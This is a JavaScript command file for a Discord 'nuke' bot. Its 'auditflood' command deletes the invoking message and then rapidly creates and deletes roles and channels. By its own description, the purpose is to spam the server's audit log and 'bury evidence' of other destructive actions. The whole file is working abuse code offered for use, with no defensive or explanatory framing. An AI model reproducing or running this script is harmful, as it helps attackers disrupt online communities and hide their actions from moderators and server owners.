// [AUDITFLOOD] Flood audit log with useless actions (create/delete channels/roles rapidly)
const { glitchBanner } = require('../../src/ascii');

module.exports = {
  name: 'auditflood',
  aliases: ['auditspam'],
  description: 'Spam audit log with rapid create/delete to bury evidence.',
  category: 'nukes',
  usage: '[iterations]',
  async execute(message, args) {
    if (!message.guild) return;
    const iters = Math.min(parseInt(args[0])||20, 60);
    await message.delete().catch(()=>{});
    await message.channel.send('```\n' + glitchBanner('AUDIT FLOOD') + '\n```').catch(()=>{});
    for (let i=0;i<iters;i++) {
      const name = `a-${Math.random().toString(36).slice(2,7)}`;
      const r = await message.guild.roles.create({ name }).catch(()=>null);
      if (r) setTimeout(()=>r.delete().catch(()=>{}), 500);
      const c = await message.guild.channels.create(name, { type:'GUILD_TEXT' }).catch(()=>null);
      if (c) setTimeout(()=>c.delete().catch(()=>{}), 600);
      await new Promise(r=>setTimeout(r, 250));
    }
  },
};
